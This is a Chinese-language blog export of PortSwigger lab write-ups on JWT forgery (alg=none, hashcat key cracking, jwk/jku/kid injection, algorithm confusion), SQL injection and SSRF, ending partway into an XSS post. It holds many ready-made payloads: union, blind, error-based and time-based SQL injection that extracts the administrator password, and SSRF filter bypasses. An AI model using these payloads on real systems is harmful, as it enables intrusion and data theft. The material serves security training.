作为例子进行说明\neyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA\nHeader 部分Header 部分就像是货车的标志，告诉了我们这辆车上面装了什么易爆品啊，还是易燃品。\n在 JWT 中 Header 部分存储的是 Token 类型和加密算法，它长成这样\n&#123;\n  \"alg\": \"HS256\",   // 也可以是 HS512, RS256 等等\n  \"typ\": \"JWT\"\n&#125;\n\nPayload 部分Payload 这个词中文意思为负载，也就是我们大货车上面的货物。Payload 里面存具体的业务数据比如用户 id 等等。\n\nPayload 部分长这样\n\n&#123;\n  \"sub\": \"1234567890\",\n  \"name\": \"John Doe\",\n  \"iat\": 1516239022\n&#125;\n\n\nSignature 部分Signature 部分意为签名，这批货送到了，需要对方签收一下，这就是签名，我个人也喜欢把它理解成 Secret，它是经历这样一个算法所生成的。\nalg 对应的加密算法(\n  base64UrlEncode(header) + &quot;.&quot; +\n  base64UrlEncode(payload),\n  我们输入的 Secret\n) secret base64 encoded\n\nSignature 是具体的数字签名密文信息，这部分的密文信息是手动设置的，一般在 Java 开发的配置文件当中设置。像这样\n\n\n我们可以在 jwt.io 中体验一下 Signature 的使用。\nJWT 与 JWT，JWE\n“JWT vs JWS vs JWE”\n这个概念了解就好了，从原理上来说是非常相似的。\n\n简单来说，现在网上大多数介绍JWT的文章实际介绍的都是 JWS(JSON Web Signature),也往往导致了人们对于 JWT 的误解，但是 JWT 并不等于 JWS，JWS 只是 JWT 的一种实现，除了 JWS 外，JWE(JSON Web Encryption) 也是 JWT 的一种实现。\nJWT 会造成的危害JWT 的漏洞经常与提权类漏洞的危害放在一起说，所以提权类的漏洞能造成什么样的危害，JWT 产生的安全问题也能产生危害。\n0x03 JWT 基础安全问题\nJWT 所产生的安全问题，是设计上与逻辑上不恰当的设计所造成的。\n其中，如果服务器未对签名进行校验，则可以任意修改数据，若进行了校验，则无法修改，需要我们通过其他手段进行辅助攻击。\n\n1. 未对签名进行验证\n前文我们说到，JWT 需要开发者提供一个 Signature ———— 签名，如果我们不对签名进行验证，极有可能产生如下的越权情况。\n\n假设选择存在一个 JWT 如下\n&#123; \n\t\"username\": \"carlos\", \n \t\"isAdmin\": false \n&#125;\n\n如果没有对签名进行认证，我们可以修改 isAdmin 属性的值为 true，即可造成简单的越权。\n\nLab: JWT authentication bypass via unverified signatureJWT 未对签名进行验证\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n我们去到 “My Accout” 界面下，登录进去，抓包，认识一下 JWT\n\n\n接着，在 Burpsuite 里面，我们查看这串 JWT。\n\n\n&#123;\n\t\"iss\":\"portswigger\",\n \t\"sub\":\"wiener\",\n \t\"exp\":1656054440\n&#125;\n\n在 Burpsuite 当中对其进行修改并发包。\n\n\n\n此时我们已经是 admin 的账户了，然后去完成我们的删除 user 的操作\n\n\n\n成功 ~!\n2. 未对加密算法进行强验证\n这一种情况，也就是未对 Header 部分的 “alg” 进行验证\n\n我们可以设置 alg 为 none，绕过验证，从而实现攻击。\n\nLab: JWT authentication bypass via flawed signature verification未对加密算法进行强验证\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n登录，抓包，在 &#x2F;my-accout 接口处，查看 JWT 的内容，修改接口为 &#x2F;admin 并发包，现在是 401 Unauthorized 的状态码。\n\n\n\n如图所示修改 sub 属性为 administrator，修改 alg 为 none。这里还需要将我们的 Signature 删除掉，因为 Signature 是通过 alg 算法生成的，但要保留”分割点”，让其成为 JWT 的形式。\n\n\n\n\n\n此时我们已经是 admin 的账户了，然后去完成我们的删除 user 的操作。\n\n\n\n3. 爆破 Secret 进行越权操作这里用到一个叫做 hashcat 的工具，kali 机一般是自带的，如果没有安装的话可以通过如下命令进行安装。\nsudo apt-get update\nsudo apt-get install hashcat\n\n爆破需要字典，这里是我在本道靶场中使用的 字典\n通过如下命令可以进行 JWT 的 Secret 的爆破\nhashcat -a 0 -m 16500 你的jwt /path/to/jwt.secrets.list\n\n\n获得 Secret 之后我们又能做什么呢？Secret 是用来生成 Signature 的一个未知的部分，所以知道它了之后便可以进行越权操作，我们通过这一道靶场感受一下。\n\n\nLab: JWT authentication bypass via weak signing key爆破 Secret 进行越权\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n先抓包，获取到 jwt 之后，我们使用 hashcat 进行 Secret 的爆破。\n\n\n这里获取到了 Secret 为 “secret1”，接着我们去到 jwt.io 下伪造身份。\n\n\n现在我们成功伪造了一个 admin 权限的用户，再进行越权操作。Success ~！\n\n\n0x04 JWT 标头注入\n这里的注入分为两种情况，当连接到数据库进行验证的时候，可能会存在 SQL 注入；若未连接至数据库时，我们可以进行越权设计。\n\n在 JWT Header 当中会存在名为 “JWK” 的属性之一，JWK 这一属性是可选的，而非向 alg 属性一样，是必填的。\n\n\nJWK 英文全称为 JSON Web Key，是一个JSON对象，表示一个加密的密钥。JWK 中的字段表示密钥的属性。\n因为是对象，所以 JWK 当中有一些参数如下。\n\njku（JSON Web Key URL） - 提供一个 URL，服务器可以从中获取一组包含正确密钥的密钥。\nkid（Key ID） - 提供一个 ID，服务器可以使用该 ID 在有多个密钥可供选择的情况下，根据密钥的格式，标识正确的密钥。\n\n一个完整的 JWT Header 长成这样，其中便含有 jwk 这一属性。\n&#123; \n\t\"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\", \n\t\"typ\": \"JWT\", \n\t\"alg\": \"RS256\", \n\t\"jwk\": \n\t&#123; \n\t\t\"kty\": \"RSA\", \n\t \t\"e\": \"AQAB\", \n\t\t\"kid\": \"ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\", \n\"n\":\"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\" \n\t&#125; \n&#125;\n\nJWT Header 的注入也分很多种，下面我们一一举例\n1. 通过 jwk 注入 JWT，形成 JWS理想情况下，服务器应当使用有限的公钥白名单来验证 JWT 签名。如果使用的公钥白名单中配置不恰当，。例如允许 jwk 的任意公钥，则会导致安全问题。\n\n我们以下面一道靶场尝试攻击方式。需要先安装 Burpsuite 的 JWT Editor Keys 插件。\n\n\nLab: JWT authentication bypass via jwk header injection通过 jwk 注入 JWT\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n同样，登录，抓包。我们将 &#x2F;my-accout 接口的包单独拿出来，选中 JSON Web Token 的界面。将 sub 的值从 “wiener” 切换为 “administrator”\n\n\n切换完之后，点击我们安装的 JWT Editor Keys 插件中的 New RSA Key，生成 2048 长度的 JWK 私钥。\n\n\n这样子一来，我们的私钥就成功创建了，因为服务器后台不比对 JWK 的私钥是否合规，我们可以直接绕过，并进行越权认证。\n\n\n现在我们成功认证为 administrator 权限，发送删除请求即可 ~\n\n\n2. 通过 jku 注入 JWT，形成 JWSjku 通常在 JWT 的 Header 部分，它长这样。\n\n\n以这一泄露为例，该 JWT 使用 RSASHA256 进行加密，而 RSA 的加密需要 n 与 e。我给大家先画幅流程图理一下攻击思路。\n\n\n\n前三步是 Burpsuite 的插件 JWT Editor Keys 可以完成的，后续操作只需要我们将 jku 指向 JWK 文件即可进行越权操作。\n\n下面这道靶场就是通过 kid 的值匹配进行攻击\n\nLab: JWT authentication bypass via jku header injection通过 jku 注入 JWT\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n在明确了攻击方式之后，我们先利用 Burpsuite 的插件 JWT Editor Keys 生成公私钥对，上一道题目生成的公私钥对也可以拿来使用。\n进入到 Expolit Server 中，在 Body 部分复制我们的 JWK 公钥。\n\n\n直接拿出来的公钥是没有 “keys” 表头的，我们需要加上此标头，类似这样\n&#123;\n    \"keys\": [\n&#123;\n    \"kty\": \"RSA\",\n    \"e\": \"AQAB\",\n    \"kid\": \"691edd2a-f7bf-4e14-b5c4-c5ec79c3dffb\",\n    \"n\": \"oCBNZNRji19rBXUxFRI9toMCRwzxSZ1ckkCvLnuKc8r_ZvRhIHNHo7Flr8_1efAyaIwx_YG7zJZG41hZcpnDE3BfZym09dAM8T65BVLTmFolqpPcZIoqO_CCIK8JU1T0oRgDaW-PCobwC0axi0-LAgb5YbODuTxmwre6bjOwCGftEL9FNgjS5TR9yB0ZxLEJTGGtk7tq5q_voRT93vmSXmjZvUnFmMXSUEIHshfXjh12XUOLs0Mjgn0gfAWM7RFbkXvF-MLvj_p26gdV3j4zHUhPbeFoepzxcBGfVQXajWjj7xfisVga1Okjqp3S53ouNMpY9OEy-UmFz-QGNxKCKw\"\n&#125;\n    ]\n&#125;\n\n\n前半部分，我们在本地生成一个 JWK，并将其存放到自己的服务器上面，已经完成了，接下来是修改 jku，使得 jku 指向 服务器。\n\n\n\n再点下面的 “Sign”，选中生成的 Sign Key，并且选择 Don’t modify header 模式，Sign 即可。\n\n\n\n现在我们已经提权完毕，执行删除操作 ~\n\n\n\n3. 通过 kid 注入 JWT，与目录遍历攻击相结合JWS 规范没有针对 kid 进行严格设置，比如必须是 uuid 的格式或者是其他的，它只是开发人员选择的任意字符串。\n那么我们可以通过将 kid 指向数据库中的特定条目，或者是指向文件名，作为验证密钥。\n当 JWT 使用的是对称加密算法的时候，极有可能存在目录遍历的漏洞，我们能够强制服务器使用其文件系统中的任意文件作为验证密钥。\n\n当目录遍历与 kid 标头注入 JWT 结合在一起时，我们可以先尝试读取 dev/null 这一文件，dev/null 这一文件默认为空文件，返回为 null，我们可以在 Symmetric Key 中，将 k 值修改为 AA== 也就是 null，进行攻击。\n\n我们来看 Port 这里的靶场\n\nLab: JWT authentication bypass via kid header path traversal通过 kid 注入 JWT，与目录遍历攻击相结合\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n这里我们先要生成一个 Symmetric Key，也就是对称密钥，并将 k 的值修改为 AA==，如图。\n\n\n接着，我们在抓到的包中修改 kid 值，尝试用目录遍历读取 dev/null 此文件。并将 sub 修改为 administrator\n\n\n点击下面的 Sign，使用 OCT8 的密钥攻击。\n\n\n成功越权，再进行删除操作即可 ~\n4. 其他的 JWT 标头攻击\ncty 标头，意义为 Content Type，有时用于为 JWT 负载中的内容声明媒体类型，一般情况下是省略的。\n\n我们可以尝试修改 cty 标头为 text/xml 或者是 application/x-java-serialized-object，这也可能导致 XXE 注入与反序列化漏洞。\n\nx5c (X.509 Certificate Chain)；有时用于传递用于对 JWT 进行数字签名的密钥的 X.509 公钥证书或证书链。此标头参数可用于注入自签名证书，类似于上面讨论的 jwk 标头注入攻击。由于 X.509 格式及其扩展的复杂性，解析这些证书也会引入漏洞。\n\n类似的 CVE 有 CVE-2017-2800 和 CVE-2018-2633。\n0x05 Web 手的 Crypto 式攻击 ———— 算法混淆漏洞一些基础知识，对称与非对称加密可以使用一系列不同的算法对 JWT 进行签名。其中一些，如HS256（HMAC + SHA-256）使用“对称”密钥。这意味着服务器使用单个密钥对 Token 进行签名和验证。显然，这需要保密，就像密码一样。\n\n\n其他算法，如RS256（RSA + SHA-256）使用“非对称”密钥对。这包括一个私钥（服务器用于对令牌进行签名）和一个可用于验证签名的数学上相关的公钥。\n\n\n顾名思义，私钥必须保密，但公钥通常是共享的，以便任何人都可以验证服务器颁发的令牌的签名。\n算法混淆漏洞的产生原因\n根本原因：JWT 库的原生安全问题。\n\n尽管实际的验证过程因所使用的算法而异，但许多库都提供了一种与算法无关的单一方法来验证签名。也就是说，我不论是对称加密方式 RS256，还是非对称加密方式 HS256，它们产生 token 的算法是与提供的加密算法无关的。\n\n当时学的时候我也愣了一下，后面看懂了。我们可以根据下面的伪代码加以理解\n\n在 JWT 库中定义了 verify() 方法\nfunction verify(token, secretOrPublicKey)&#123; \n\talgorithm = token.getAlgHeader(); \n\tif(algorithm == \"RS256\")\n\t&#123; \n\t\t// Use the provided key as an RSA public key \n\t&#125; \n\t\telse if (algorithm == \"HS256\")\n\t\t&#123; \n\t\t\t// Use the provided key as an HMAC secret key \n\t\t&#125; \n&#125;\n\n\n当我们使用 RS256 这种非对称加密的时候，他们可能总是将一个固定的公钥传递给该方法。\n\npublicKey = &lt;public-key-of-server>; \ntoken = request.getCookie(\"session\"); \nverify(token, publicKey);\n\n因为 publicKey 是一样的，所以会导致在使用对称加密的时候，造成 publicKey 的泄露，容易造成一系列的安全问题。\n执行算法混淆攻击\n还是画个流程图，清楚一点\n\n\n\n/jwks.json 泄露的算法混淆攻击以下面这道靶场感受一下算法混淆攻击\n\nLab: JWT authentication bypass via algorithm confusion执行算法混淆攻击\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n先进行第一步，获取它的服务器公钥，访问 /jwks.json 接口，前文我们提到过这个接口是也可能存在信息泄露的可能的。将这个 JWK 复制下来，作为我们第二部的 RSA Key。\n\n\n接着，进行第二步，到 Burpsuite 的 JWT Editor Keys 去。生成新的 RSA Key，这里用之前泄露的 JWK。\n\n\n然后把这串东西选中 “Copy Public Key as PEM”，将其进行 base64 编码操作，保存一下得到的字符串。这里编码要注意，上下的一串 -----END PUBLIC KEY----- 不要删掉。\n保存完后，在 JWT Editor Keys 处，生成新的对称加密 Key，用之前保存的 base64 编码去替换 k 的值。\n修改 alg 为 HS256，修改 sub 为 administrator。再进行 Sign 操作，最后发包即可。\n\n\n/jwks.json 未泄露的算法混淆攻击\n在这种情况下，基于我们登录之后产生一个 JWT，在 logout 之后重新登录，会产生一个不同的 JWT，我们可以将两个 JWT 相比对，得到公钥。\n\n\nLab: JWT authentication bypass via algorithm confusion with no exposed key&#x2F;jwks.json 未泄露的算法混淆攻击\n\n\n靶场要求，利用 admin 的越权账户删除 carlos 账户。\n\n按照我们之前说的方式，登录登出，再登录，获取两个 JWT，将其放到 Port 提供的 docker 工具里面运行。\n运行的命令如下\ndocker run --rm -it portswigger/sig2n &lt;token1> &lt;token2>\n\n\n\n\n此脚本会输出一系列 token 的存在情况值，\n\n\n\n这里我们尝试每一个 Tempered JWT，Port 这里给了提示说是 X.509 形式的，所以我们只需要将 X.509 形式的 JWT 进行验证即可。\n当 Response 回应 200 时，代表 token 是有效的，若为 302 则代表了重定向。下图是一个成功的案例。\n\n\n将这一 JWT 的 Base64 编码拿过来，先放到记事本里面暂存。去到 Burpsuite 的 JWT Editor Keys，点击 New Symmetric Key，将上面的 Base64 编码拿过来替换此对称密钥的 k 值。\n生成对称密钥之后，进行和之前攻击一致的 Sign 操作\n\n\n此时已经成功越权，执行删除操作即可。\n0x06 JWT 安全问题的防护\n使用最新的 JWT 库，虽然最新版本的稳定性有待商榷，但是安全性都是较高的。\n对 jku 标头进行严格的白名单设置。\n确保 kid 标头不容易受到通过 header 参数进行目录遍历或 SQL 注入的攻击。\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-SQL注入","url":"/2021/07/21/PortSwigger-SQL%E6%B3%A8%E5%85%A5/","content":"Port SQL 注入\n\n\nSQL注入的根本：使得SQL语句闭合。\n\n闭合中会讲到一堆绕过，详见SQL注入绕过姿势\n爆破的三个对象，爆库，爆表，爆列\n爆破库名\n1' union select 1,2,database()\n\n爆破表名\n1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n\n1' union select 1,2,group_concat(table_name) from information_schema.columns where table_schema=database()\n\n爆破column名\n1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()\n\n知道columns名之后，爆破数据\n1' union select 1,2,group_concat(column_name) from database()\n\n1.检索隐藏数据\n修改SQL查询以返回其他结果\n举个例子：在某个购物品牌的页面，被展出的那些都是已发布的产品，而我们要做的就是通过攻击，从而获得那些为发布的产品的信息。\n\n例如\n\n考虑展示不同类别产品的购物应用程序。当用户单击礼品类别时，他们的浏览器请求URL：https://insecure-website.com/products?category=Gifts\n\n对category=Gifts进行绕过\n\n利用 category=&#39;Gifts&#39; OR 1=1--&#39;   因为1&#x3D;1始终成立，所以查询将返回所有项目\n\n\n2.颠覆应用逻辑普通的查询\nSELECT * FROM users WHERE username = '' AND password = ''\n\n如果查询返回用户的详细信息，则登录成功。否则，它将被拒绝。\n\n攻击方式\n\nSELECT * FROM users WHERE username = 'administrator'--' AND password = ''\n\n3.SQL联合注入\n联合注入: 即union select\n\n要执行SQL注入 union 攻击，需要确保union查询满足这一条件。\nunion查询条件\n\n单个查询必须返回相同数量的列。\n每个列中的数据类型必须在单个查询之间兼容。\n\n\n要执行SQL联合注入 union 攻击，需要确保攻击符合这两个要求。\n利用union注入要求\n\n字段数\n从原始查询返回的哪些列具有合适的数据类型、注入点\n\n\n3.1确定SQL UNION注入所需的列数\n两种查询方法\n\nSolution1  假设注注点是原始查询条款中的引用字\n符串，使用payload：ORDER BY WHERE\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\netc.\n\nSolution2及提交一系列payload，指定不同数量的空值：UNION SELECT\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\netc.\n\n\n特别的：在Oracle中，需要改为\n\nUNION SELECT NULL FROM DUAL--\n\n如果union,select,or这些都被过滤的时候，尝试双写绕过\npayload:\n1’ununionion seselectlect 1#&amp;password=1\n\n3.2 在SQL UNION联合注入中查找具有有用数据类型的列\n在3.1操作后，通过提交一系列payload来检测每个列是否可以保留字符串数据\n\n' UNION SELECT 'a',NULL,NULL,NULL--\n' UNION SELECT NULL,'a',NULL,NULL--\n' UNION SELECT NULL,NULL,'a',NULL-- \n' UNION SELECT NULL,NULL,NULL,'a'--         // 类似于此\n\n\n如果列的数据类型与字符串数据不兼容，则注入的查询将导致报错\n\nConversion failed when converting the varchar value 'a' to data type int.\n\n\n联合查询中有个小技巧，在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据。举个例子：最初users表中只有一行数据\n\n\n\n我们通过union select查询就可以构造一行虚拟的数据\n\n\n4. SQL注入盲注\n当应用程序易受SQL注射时，会出现SQL注入盲注。\n但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的细节。\n\n4.1 通过回显来利用盲目的SQL注射检测是否存在SQL注入\n\n对于cookie以及其他注入点\n\n…xyz' AND '1'='1\n…xyz' AND '1'='2\n\n\n如果&#39;1&#39;=&#39;1与&#39;1&#39;=&#39;2的回显不同，则说明存在SQL注入\n\n重点：关注回显\n\n\n使用的payload便是\nxyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a           // 先判断密码长度\n\n\nxyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm      // 使用Intruder进行爆破\n\n当substr函数被ban的时候，我们可以考虑使用其他功能类似的函数\nsubtring-----> 功能一致\nmid('abc',1,1)-------->'b'\nleft('abc',1,1)-------->'a'\n\n4.2 通过触发SQL错误来诱导有条件响应\n针对于cookie以及其他注入点\n\nxyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a\nxyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a\n\n\n使用第一个输入，表示将进行评估，这不会导致任何错误。使用第二个输入，它会评估，这会导致除以零的错误。\n评估根据不同的类型的数据库进行，详见SQL injection cheat sheet | Web Security Academy (portswigger.net)\n\n那么使用的payload便是：\nxyz' AND (SELECT CASE WHEN (1=1) THEN (1/0) ELSE '' END FROM users WHERE username='administrator') 'administrator           // 确认username\n\n\n\n核心！\n替换CASE WHEN 当中的条件，从而进行攻击\n\n\n例如\n\nxyz'AND (SELECT CASE WHEN LENGTH(password)>1 THEN (1/0) ELSE '' END FROM users WHERE username='administrator')'\n\nxyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'  // Oracle_payload\n\n4.3 SQL注入盲注时间延迟时间盲注的背景注入SQL 代码之后， 存在以下两种情况：\n\n如果注入的SQL代码不影响后台[ 数据库] 的正常功能执行， 那么Web 应用的页面显示正确（ 原始页面） 。\n如果注入的SQL代码影响后台数据库的正常功能（ 产生了SQL 注入） ， 但是此时Web应用的页面依旧显示正常（ 原因是Web 应用程序采取了“ 重定向” 或“ 屏蔽 ”措施）。\n\n产生一个疑问：注入的SQL代码到底被后台数据库执行了没有？ 即web应用程序是否存在SQL注入？面对这种情况，之前讲的基于布尔的SQL盲注很难发挥作用了（ 因为基于布尔的SQL盲注的前提是web程序返回的页面存在true和false两种不同的页面）。这时，一般采用基于web应用响应时间上的差异来判断是否存在SQL注入， 即基于时间型SQL盲注。\n\n延时注入又称时间盲注，也是盲注的一种。通过构造延时注入语句后，浏览器页面的响应时间来判断正确的数据\n\n\n针对于cookie以及其他注入点\n\n直接在request 下\n'; IF (1=2) WAITFOR DELAY '0:0:10'--      \n'; IF (1=1) WAITFOR DELAY '0:0:10'-- \n\n\n第二个(1&#x3D;1)会触发10秒的延迟\n\n4.4 SQL盲注 时间延迟和条件型信息检索是4.2与4.3的结合体使用的payload\n'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--\n'%3B SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--\n\t// %3B通过url转码，得到是;\n\t// 第一个成功延迟，第二个失败 \n\n\n用来判断是否有用户被调用\n\n'%3B SELECT CASE WHEN (username='administrator')   THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--administrator\n\n5.SQL报错注入\n最常用的xpath报错注入——————updatexml()与extractvalue()\n\n5.1 updatexml()函数进行SQL报错注入\nupdatexml()的作用：改变文档中符合条件的节点的值\n\n\n语法\n\nupdatexml（XML_document，XPath_string，new_value）\n\n第一个参数：是string格式，为XML文档对象的名称，文中为Doc第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据。\n例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。\n\n爆数据库\n\n1' and updatexml(1,concat(0x7e,database()),1)#\n\n爆数据表\n\n1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #\n\n\n爆user表字段信息\n\n1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name=table_name),0x7e),1) #\n\n\n爆内容\n\n1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,column_name) from dvwa.users)),1) #\n\n5.2 使用extractvalue()函数作用：从目标XML中返回包含所查询值的字符串 \n\n语法：extractvalue(XML_document，xpath_string)第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串）\n\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n使用extractvalue时若xpath_string格式出现错误，则会爆出xpath语法错误(xpath syntax)\nselect user,password from users where user_id=1 and (extractvalue(1,0x7e));\n\n由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。\n例子：\n爆数据库：\n1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #\n\n爆数据表：\n1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #\n\n字段：\n1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='table_name'))) #\n\n爆数据：\n1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #\n\n6. SQL堆叠注入\n也就是在注入的时间插入分号\n\n\n例如\n\n1'; show tables from information_schema; #\n\n\n表名为数字时，要用反引号包起来查询\n\n\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-SSRF基础","url":"/2021/07/25/PortSwigger-SSRF%E5%9F%BA%E7%A1%80/","content":"Port SSRF\n\nSSRF笔记SSRF可以获得(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;\n(2)、攻击运行在内网或本地的应用程序（比如溢出）;\n(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;\n(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;\n(5)、利用File协议读取本地文件。\n形成原因\n大都是由于服务端提供了从其他服务器应用数据的功能\n且没有对目标地址做过滤与限制\n\n\n\n\n如何操作针对本地服务器的SSRF\n先尝试http://localhost/admin的方式，观察回显\n然后根据题意，例如删除数据\n\nhttp:&#x2F;&#x2F;localhost&#x2F;admin&#x2F;delete?username&#x3D;carlos\n\n针对后端的SSRF绕过方法：\n加端口\n\n127.0.0.1:80\n\n\n短网址\n指向任意IP的域名xip.io\n\n  127.0.0.1.xip.io\n\nIP限制绕过\n\n\n\n\n常见的SSRF攻击1. SSRF攻击服务器本身\n服务器向指定的URL提出请求，检索库存状态。\n\n\n 具体操作\n\n先将请求点修改为 \nhttp:&#x2F;&#x2F;localhost&#x2F;admin\n\n再进一步进行提权的操作\n\n例如：删除某个数据\n\nhttp:&#x2F;&#x2F;localhost&#x2F;admin&#x2F;delete?username&#x3D;carlos\n\n分析原因\n访问控制检查可能在位于应用服务器前面的不同组件中实施。当连接返回到服务器本身时，检查被绕过。\n出于灾难恢复目的，应用程序可能允许来自本地机器的任何用户在不登录的情况下进行行政访问。这为管理员在丢失凭据时恢复系统提供了一种方法。这里的假设是，只有完全信任的用户才会直接来自服务器本身。\n与主应用程序相比，管理界面可能正在监听不同的端口编号，因此用户可能无法直接访问。\n\n2.SSRF攻击其他后端系统内部后端系统包含敏感功能，任何人都可以与系统交互，无需身份验证即可访问这些功能。可以使用类似的payload某个api&#x3D; http:&#x2F;&#x2F;192.168.0.x&#x2F;admin       &#x2F;&#x2F; 使用Inturder爆破\n\n\n\n3. 带有基于黑名单的输入过滤器的SSRF起因：某些应用程序阻止包含主机名或敏感URL的输入。在这种情况下，您通常可以使用各种技术绕过过滤器：127.0.0.1/admin具体payload\n\n使用替代IP表示，127.0.0.1\n\n使用ip的八进制或者十进制\n2130706433（10进制ip）\n127.0.0.1的八进制表示为017700000001\n127.1 (短ip)\n\n\n注册自己的域名，解决可以为此目的使用127.0.0.1.spoofed.burpcollaborator.net\n使用URL编码或案例变体混淆已阻止的字符串。\n\n举例\n输入http://127.0.0.1时被弱SSRF防御\n改用http://127.1的短ip成功绕过\n当输入http://127.1/admin时被防御\n改用http://127.1/%2561dmin绕过\n4.SSRF与基于白名单的输入过滤器\n使用字符在主机名之前将get请求的参数嵌入到URL中。例如：。@https://expected-host@evil-host\n使用该字符表示URL片段。例如：。添加# https://evil-host#expected-host\n利用DNS命名等级将所需的输入放入控制的完全合格的DNS名称中。例如：。https://expected-host.evil-host\n对字符进行URL编码，以混淆URL解析代码。如果实施筛选器的代码处理URL编码字符的方式与执行后端HTTP请求的代码不同，则这尤其有用。\n\n例如此payload\nhttp:&#x2F;&#x2F;localhost:80&#x2F;%2523username@stock.weliketoshop.net&#x2F;admin&#x2F;delete?username&#x3D;carlos                      &#x2F;&#x2F; 删除carlos\n\n5.SSRF重定向绕过原理：如果用于使后端HTTP请求支持重定向的API，则可以构建一个满足筛选器并导致将请求重定向到所需的后端目标的URL。使用的payload\n\n修改重定向为192.168.0.x/admin\n\n?path&#x3D;http:&#x2F;&#x2F;192.168.0.12:8080&#x2F;admin\n\n\n要求先打开重定向的通道，再进行重定向\n\n6.伪造XFF与Referer的SSRF用bp抓包后修改\nX-Forwarded-For:127.0.0.1\nReferer:localhost\n\n","categories":["Port"],"tags":["web安全"]},{"title":"PortSwigger-XSS攻击","url":"/2021/11/01/PortSwigger-XSS%E6%94%BB%E5%87%BB/","content":"Port XSS\n\n什么是XSSXSS全称——————Cross-Site Script\n允许攻击者与应用程序进行交互。攻击者可以利用XSS伪装成受害者，从而利用受害者身份执行其身份下能够执行的任何操作，包括查看其权限下任何数据，所以XSS的危害还是可大可小的，主要取决于受害者的权限大小。\n0x01 XSS攻击原理\n修改JavaScript脚本，构建恶意代码。\n\n\n这里主要介绍三种最常见的XSS攻击，反射型XSS，存储型XSS，基于DOM的XSS，其中存储型XSS最为严重。\n\n0x02 反射型XSS什么是反射型XSS？\n反射型XSS就是应用程序接收到一个HTTP请求，然后以不安全的方式映射到响应中，例如某应用程序构造以参数值为索引的HTTP请求。是一时使用的。\n\n例如，在此GET请求中\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;search?term&#x3D;gift\n\n此请求可以将参数拼接到HTTP Response中\n&lt;p> You searched for : gift &lt;/p>\n\n\n那我们将代码恶意修改呢？\n\nhttps:&#x2F;&#x2F;insecure-website.com&#x2F;search?term&#x3D;&lt;script&gt;&#x2F;*+Bad+stuff+here...+*&#x2F;&lt;&#x2F;script&gt;\n\n映射到的HTTP Response\n&lt;p>You searched for: &lt;script>/* Bad stuff here... 